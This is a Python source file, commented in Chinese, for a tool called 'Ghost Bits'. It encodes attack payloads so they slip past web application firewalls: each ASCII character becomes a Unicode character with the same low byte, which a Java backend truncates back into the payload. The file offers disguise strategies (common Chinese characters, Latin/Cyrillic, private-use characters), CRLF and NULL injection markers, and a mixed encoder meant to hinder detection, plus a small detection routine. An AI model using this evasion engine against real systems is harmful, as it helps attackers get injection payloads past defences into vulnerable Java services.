#!/usr/bin/env python3
"""
Ghost Bits 核心编码/解码引擎

原理：Java char (16-bit) 强制转换为 byte (8-bit) 时，高 8 位被截断。
攻击者将 payload 中每个 ASCII 字符替换为高位不同但低位相同的 Unicode 字符，
WAF 看到无害 Unicode，Java 后端截断后还原出攻击载荷。
"""

import random
from typing import Optional


class CharsetStrategy:
    """字符集伪装策略基类"""

    name: str = "base"
    description: str = ""

    def get_high_bytes(self, low_byte: int) -> list[int]:
        """返回可用的高位字节列表"""
        raise NotImplementedError


class GB2312Strategy(CharsetStrategy):
    """GB2312 一级常用汉字伪装 - 最隐蔽，看起来像正常中文"""

    name = "gb2312"
    description = "GB2312 一级常用汉字（最隐蔽，流量看起来像中文内容）"

    def get_high_bytes(self, low_byte: int) -> list[int]:
        valid = []
        fallback = []
        for hh in range(0x4E, 0x9F + 1):
            codepoint = (hh << 8) | low_byte
            if 0x4E00 <= codepoint <= 0x9FA5:
                char = chr(codepoint)
                fallback.append(hh)
                try:
                    gb_bytes = char.encode("gb2312")
                    if 0xB0 <= gb_bytes[0] <= 0xD7:
                        valid.append(hh)
                except (UnicodeEncodeError, UnicodeDecodeError):
                    pass
        return valid if valid else fallback


class CJKStrategy(CharsetStrategy):
    """CJK 统一汉字全范围 - 覆盖面更广"""

    name = "cjk"
    description = "CJK 统一汉字全范围（U+4E00-U+9FFF）"

    def get_high_bytes(self, low_byte: int) -> list[int]:
        valid = []
        for hh in range(0x4E, 0x9F + 1):
            codepoint = (hh << 8) | low_byte
            if 0x4E00 <= codepoint <= 0x9FFF:
                valid.append(hh)
        return valid


class LatinExtStrategy(CharsetStrategy):
    """拉丁/希腊/西里尔文伪装 - 适合英文环境"""

    name = "latin"
    description = "拉丁扩展/希腊/西里尔文（适合英文环境流量）"

    def get_high_bytes(self, low_byte: int) -> list[int]:
        # Latin Extended (0x01xx-0x02xx), Greek (0x03xx), Cyrillic (0x04xx)
        return [0x01, 0x02, 0x03, 0x04, 0x05]


class RandomStrategy(CharsetStrategy):
    """全字符集随机 - 最大熵，但流量特征明显"""

    name = "random"
    description = "全字符集随机（最大变异度，但流量特征较明显）"

    def get_high_bytes(self, low_byte: int) -> list[int]:
        # 排除 UTF-16 代理对区域 (0xD800-0xDFFF)
        return [hh for hh in range(0x01, 0xFF + 1) if not (0xD8 <= hh <= 0xDF)]


class PrivateUseStrategy(CharsetStrategy):
    """Unicode 私用区 - 不会被字体渲染，适合隐蔽传输"""

    name = "private"
    description = "Unicode 私用区（U+E000-U+F8FF，不可见字符）"

    def get_high_bytes(self, low_byte: int) -> list[int]:
        # Private Use Area: U+E000 to U+F8FF → high bytes 0xE0 to 0xF8
        return [hh for hh in range(0xE0, 0xF8 + 1) if not (0xD8 <= hh <= 0xDF)]


# 策略注册表
CHARSET_STRATEGIES: dict[str, type[CharsetStrategy]] = {
    "gb2312": GB2312Strategy,
    "cjk": CJKStrategy,
    "latin": LatinExtStrategy,
    "random": RandomStrategy,
    "private": PrivateUseStrategy,
}


class GhostBitsEngine:
    """Ghost Bits 编码/解码核心引擎"""

    def __init__(self, charset: str = "gb2312", seed: Optional[int] = None):
        """
        Args:
            charset: 伪装字符集策略名称
            seed: 随机种子（用于可复现的编码结果）
        """
        if charset not in CHARSET_STRATEGIES:
            raise ValueError(
                f"Unknown charset: {charset}. "
                f"Available: {list(CHARSET_STRATEGIES.keys())}"
            )
        self.strategy = CHARSET_STRATEGIES[charset]()
        self.rng = random.Random(seed)

    def encode_char(self, char: str) -> str:
        """将单个 ASCII 字符编码为 Ghost Bits 形式"""
        code = ord(char)
        if code > 255:
            # 非 ASCII 字符不处理
            return char

        high_bytes = self.strategy.get_high_bytes(code)
        if not high_bytes:
            return char

        chosen_hh = self.rng.choice(high_bytes)
        return chr((chosen_hh << 8) | code)

    def encode(
        self,
        payload: str,
        exempt: str = "",
        repeat: int = 1,
        tail: str = "",
    ) -> str:
        """
        编码完整 payload

        Args:
            payload: 原始攻击载荷
            exempt: 豁免字符（不进行编码转换）
            repeat: payload 重复次数
            tail: 追加的明文尾部
        """
        # 处理转义序列
        payload = self._process_escapes(payload)
        tail = self._process_escapes(tail)

        result = []
        for _ in range(repeat):
            for char in payload:
                if char in exempt:
                    result.append(char)
                else:
                    result.append(self.encode_char(char))

        result.append(tail)
        return "".join(result)

    def decode(self, encoded: str, raw: bool = False) -> str:
        """
        解码 Ghost Bits 编码的字符串，还原实际执行的 payload

        对每个字符取低 8 位，模拟 Java (byte)char 截断行为

        Args:
            encoded: Ghost Bits 编码的字符串
            raw: 如果为 True，控制字符直接输出；否则用 \\xXX 转义表示
        """
        result = []
        for char in encoded:
            code = ord(char)
            if code > 255:
                # 截断高位，只保留低 8 位
                low_byte = code & 0xFF
                if 0x20 <= low_byte <= 0x7E:
                    result.append(chr(low_byte))
                elif raw:
                    result.append(chr(low_byte))
                else:
                    # 控制字符用转义表示
                    result.append(f"\\x{low_byte:02x}")
            else:
                result.append(char)
        return "".join(result)

    def analyze(self, text: str) -> dict:
        """
        分析文本中的 Ghost Bits 特征

        Returns:
            包含检测结果的字典
        """
        ghost_chars = []
        total_chars = len(text)
        suspicious_count = 0

        for i, char in enumerate(text):
            code = ord(char)
            if code > 255:
                low_byte = code & 0xFF
                # 低位是可打印 ASCII 且高位非零 → 高度可疑
                if 0x20 <= low_byte <= 0x7E:
                    suspicious_count += 1
                    ghost_chars.append({
                        "position": i,
                        "char": char,
                        "codepoint": f"U+{code:04X}",
                        "decoded_as": chr(low_byte),
                        "high_byte": f"0x{(code >> 8):02X}",
                    })

        # 计算 Ghost Bits 密度
        density = suspicious_count / total_chars if total_chars > 0 else 0

        return {
            "total_chars": total_chars,
            "suspicious_chars": suspicious_count,
            "density": density,
            "is_ghost_bits": density > 0.3,  # 超过 30% 高度可疑
            "confidence": min(density * 2, 1.0),  # 置信度
            "decoded_payload": self.decode(text),
            "ghost_chars": ghost_chars[:20],  # 只返回前 20 个示例
        }

    @staticmethod
    def _process_escapes(text: str) -> str:
        """处理特殊转义标记"""
        text = text.replace("[CRLF]", "\r\n")
        text = text.replace("[CR]", "\r")
        text = text.replace("[LF]", "\n")
        text = text.replace("[TAB]", "\t")
        text = text.replace("[NULL]", "\x00")
        text = text.replace("\\r", "\r")
        text = text.replace("\\n", "\n")
        text = text.replace("\\t", "\t")
        text = text.replace("\\0", "\x00")
        return text


class OutputFormatter:
    """输出格式化器"""

    @staticmethod
    def raw(text: str) -> str:
        """原始 Unicode 输出"""
        return text

    @staticmethod
    def unicode_escape(text: str) -> str:
        """\\uXXXX 转义格式（适用于 JSON、Java 源码）"""
        result = []
        for char in text:
            code = ord(char)
            if code > 127:
                result.append(f"\\u{code:04x}")
            elif code < 0x20 or code == 0x7F:
                result.append(f"\\u{code:04x}")
            else:
                result.append(char)
        return "".join(result)

    @staticmethod
    def percent_encode(text: str) -> str:
        """%uXXXX URL 编码格式（适用于 HTTP 请求）"""
        result = []
        for char in text:
            code = ord(char)
            if code > 127:
                result.append(f"%u{code:04X}")
            elif code < 0x20 or code == 0x7F:
                result.append(f"%{code:02X}")
            elif char in " %&=?#":
                result.append(f"%{code:02X}")
            else:
                result.append(char)
        return "".join(result)

    @staticmethod
    def mixed_encode(text: str) -> str:
        """混合编码 - 随机选择编码方式增加检测难度"""
        rng = random.Random()
        result = []
        for char in text:
            code = ord(char)
            if code > 127:
                fmt = rng.choice(["unicode", "percent", "html"])
                if fmt == "unicode":
                    result.append(f"\\u{code:04x}")
                elif fmt == "percent":
                    result.append(f"%u{code:04X}")
                else:
                    result.append(f"&#{code};")
            else:
                result.append(char)
        return "".join(result)

    @staticmethod
    def hex_encode(text: str) -> str:
        """十六进制编码（适用于二进制协议）"""
        result = []
        for char in text:
            code = ord(char)
            if code > 255:
                result.append(f"\\x{(code >> 8):02x}\\x{(code & 0xFF):02x}")
            else:
                result.append(f"\\x{code:02x}")
        return "".join(result)


# 格式化器注册表
OUTPUT_FORMATS: dict[str, callable] = {
    "raw": OutputFormatter.raw,
    "unicode": OutputFormatter.unicode_escape,
    "percent": OutputFormatter.percent_encode,
    "mixed": OutputFormatter.mixed_encode,
    "hex": OutputFormatter.hex_encode,
}
